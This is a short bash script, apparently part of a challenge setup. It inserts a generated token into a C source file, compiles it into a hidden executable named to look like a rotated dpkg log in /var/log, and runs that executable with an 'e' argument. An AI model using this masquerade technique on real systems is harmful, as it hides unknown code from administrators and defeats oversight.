#!/bin/bash
T6=$(python3 /tmp/gen_token6.py)
sed -i "s/PLACEHOLDER/$T6/" /tmp/crypt.c
unset T6
unset TOKEN{1,2,3,4,5,6,7,8,9}
gcc -o /var/log/.dpkg.log.1.gz /tmp/crypt.c
chmod +x /var/log/.dpkg.log.1.gz
/var/log/.dpkg.log.1.gz e 
